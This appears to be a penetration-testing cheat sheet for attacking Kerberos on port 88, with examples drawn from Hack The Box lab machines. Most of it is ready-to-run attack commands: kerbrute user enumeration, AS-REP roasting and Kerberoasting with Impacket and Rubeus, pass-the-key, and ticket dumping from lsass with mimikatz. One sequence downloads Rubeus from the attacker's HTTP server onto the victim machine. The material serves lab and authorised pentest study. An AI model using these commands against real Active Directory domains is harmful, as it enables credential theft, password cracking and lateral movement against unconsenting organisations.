# Kerberos - 88

## Kerberos Information

Kerberos is a protocol for authentication, not authorization. In other words, it allows for the identification of each user who provides a secret password, but it does not validate which resources or services this user has access to. Active Directory makes use of Kerberos. Kerberos provides information about each user's privileges on this platform, but it is the responsibility of each service to determine whether the user has access to its resources.

Default Port: 88/tcp/udp

```text
PORT   STATE SERVICE
88/tcp open  kerberos-sec
```

### Kerberos User Enumeration

We can enumerate users in Kerberos with:

```text
kerbrute userenum -d egotistical-bank.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc sauna.htb
```

{% embed url="https://github.com/ropnop/kerbrute" %}

## Abuse Kerberos

### ASEPRoasting

If the Kerberos pre-authentication has been disabled for an account, that means that it is vulnerable to ASREPRoasting. As soon as we have a username, we can use the GetNPUsers script from Impacket to retrieve its password hash:

```text
GetNPUsers.py domain/ -request -no-pass -dc-ip 10.10.10.11 -usersfile users.txt 2>/dev/null
GetNPUsers.py domain/username -request -no-pass -dc-ip 10.10.10.11
```

After capturing the hash, you can then copy the TGT in a file and try to crack it with john or hashcat.

Alternatively, we can use GetUserSPNs.py

```text
GetUsersSPNs.py htb.local/username:password@10.10.10.1671 -dc-ip 10.10.10.161 2>/dev/null
```

### Rubeus ASREPRoasting

```text
Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

### Kerberoasting from the Attacker Machine

If Kerberos is open, then you may try a Kerberoasting attack with GetUsersSPNs script from Impacket:

```text
impacket-GetUserSPNs domain.local/user:password -request 
impacket-GetUserSPNs domain.local/user:password -request -dc-ip 10.10.10.10
```

If Kerberos was port forwarded to your localhost then you may try the following:

```text
impacket-GetUserSPNs domain.local/user:password -request -dc-ip 127.0.0.1
GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.161
```

### Kerberoasting on Victim Machine

#### Rubeus

Rubeus.exe is one of the many tools that can perform a Kerberoasting attack on the victim machine.

Clone rubeus.exe on the attacker machine

```text
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
```

Set up a listener to transfer the file to the victim machines

```text
python -m http.server 80
```

Download the file from the attacker's machine.

```text
iwr -uri http://10.10.10.11/Rubeus.exe -OutFile Rubeus.exe
```

Execute the Kerberoasting attack on the victim machine \(in this example we will perform a Kerberoasting with alternate credentials\)

```text
C:\temp\Rubeus.exe -> check the roating possibilities
C:\temp\Rubeus.exe kerberoast /creduser:domain.local\user /credpassword:password1234
```

You will then see the hash that you can copy into the attacker machine and try to crack it with john or hashcat.

#### Rubeus Alternative

```text
Rubeus.exe kerberoast /outfile:output_TGS_file
```

```text
Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
```

### Pass the key \(PTK\)

```text
.\Rubeus.exe asktgt /domain: /user: /rc4: /ptt
```

### Harvesting Tickets from Windows

The lsass \(Local Security Authority Subsystem Service\) process, which is responsible for security in Windows, handles and stores tickets. As a result, in order to obtain tickets from a Windows machine, you must contact with lsass and request them. Only owned tickets can be retrieved as a non-administrative user; however, as a machine administrator, you can harvest all of them.

```text
mimikatz # sekurlsa::tickets /export
# Rubeus when Mimikatz doesn't work.
.\Rubeus dump [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### Harvesting Tickets from Linux

Extract  tickets from Linux Kernel Keyrings \(read the repo\):

{% embed url="https://github.com/TarlogicSecurity/tickey" %}

```text
/tmp/tickey -i
```



